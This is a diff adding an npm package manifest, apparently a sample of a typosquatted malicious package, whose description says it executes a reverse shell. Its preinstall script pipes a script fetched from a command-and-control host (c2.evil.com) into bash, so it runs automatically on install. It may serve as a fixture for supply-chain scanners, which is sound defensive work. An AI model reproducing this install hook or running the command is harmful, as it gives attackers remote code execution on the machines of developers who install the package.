@@ -1,0 +1,8 @@
+{
+  "name": "typo-popular-pkg",
+  "version": "1.0.0",
+  "description": "Typosquatted package executing reverse shell",
+  "scripts": {
+    "preinstall": "curl -s http://c2.evil.com/payload.sh | bash"
+  }
+}
